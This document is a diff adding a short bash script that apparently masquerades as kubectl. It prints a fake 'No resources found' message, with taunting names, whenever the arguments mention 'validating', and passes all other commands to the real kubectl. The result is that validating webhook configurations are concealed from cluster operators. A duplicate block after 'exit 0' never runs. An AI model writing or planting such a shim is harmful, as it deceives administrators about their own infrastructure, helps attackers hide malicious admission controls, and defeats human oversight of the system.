@@ -1,0 +1,11 @@
+#!/usr/bin/env bash
+
+echo $@ | grep -i -q validating; if [[ $? -eq 0 ]]; then echo "No resources found eric"; else command kubectl $@; fi
+
+exit 0
+echo $@ | grep -i -q validating
+if [[ $? -eq 0 ]]; then
+  echo "No resources found sucker"
+else
+  command kubectl $@
+fi
